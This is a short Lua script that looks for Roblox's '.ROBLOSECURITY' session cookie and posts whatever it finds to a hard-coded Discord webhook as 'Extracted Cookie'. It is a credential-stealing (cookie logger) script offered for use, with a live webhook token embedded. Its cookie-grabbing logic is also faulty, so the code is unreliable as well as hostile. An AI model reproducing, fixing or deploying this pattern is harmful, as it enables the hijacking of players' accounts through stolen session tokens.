local function getCookie(url, cookieName)
    local response_body = {}
    local res, code, response_headers = https.request{
        url = url,
        sink = ltn12.sink.table(response_body),
        redirect = true -- Follow redirects if necessary
    }

    if code == 200 then
        -- Extract cookies from the response headers
        local cookies = response_headers["set-cookie"]
        if cookies then
            for cookie in cookies:gmatch("[^,]+") do
                if cookie:find(cookieName) then
                    return cookie -- Return the specific cookie
                end
            end
        else
            print("No cookies found.")
            return nil
        end
    else
        print("HTTP request failed with code: " .. code)
        return nil
    end
end

-- Function to send a message to a Discord webhook
local function sendToDiscord(webhookUrl, message)
    local payload = {
        content = message
    }
    local jsonPayload = json.encode(payload)

    local res, code, response_headers = https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#jsonPayload)
        },
        source = ltn12.source.string(jsonPayload)
    }

    if code == 204 then
        print("Message sent to Discord successfully.")
    else
        print("Failed to send message to Discord. HTTP code: " .. code)
    end
end

-- Example usage
local url = "http://roblox.com" -- Replace with the target URL
local cookieName = ".ROBLOSECURITY" -- Replace with the name of the cookie you want
local webhookUrl = "https://discord.com/api/webhooks/1311638120458092574/O7kAiVk3uaoZECruyG6dHUzyKckQ1wo97lIYOAUdXWWU6Gh6wIKHgBIJYwmxBpG3y7dq"

local cookie = getCookie(url, cookieName)
if cookie then
    sendToDiscord(webhookUrl, "Extracted Cookie: " .. cookie)
else
    print("Cookie not found.")
end
